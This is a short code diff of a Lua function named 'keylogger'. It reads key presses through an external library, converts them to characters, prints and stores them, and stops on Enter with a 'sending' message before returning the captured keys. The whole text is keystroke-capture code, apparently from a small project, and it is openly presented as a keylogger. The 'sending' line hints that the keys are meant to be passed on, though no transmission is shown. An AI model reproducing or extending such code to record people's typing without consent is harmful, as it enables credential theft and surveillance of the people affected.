@@ -5,18 +5,24 @@ function keylogger()
 	local Pressed = {}
 
 	while true do
-		local key = mylib.pegaChave()
+		local keyValue = mylib.getKey()
+		local key = asciiToString(keyValue)
 
-		if(key==27) then
+		print(key)
+
+		if(keyValue==13) then
+			print("sending")
 			break
 		end
 
 		table.insert(Pressed,key)
 
-		print(key);
-
 	end
 
 	return Pressed
 
+end
+
+function asciiToString(asciiValue)
+    return string.char(asciiValue)
 end
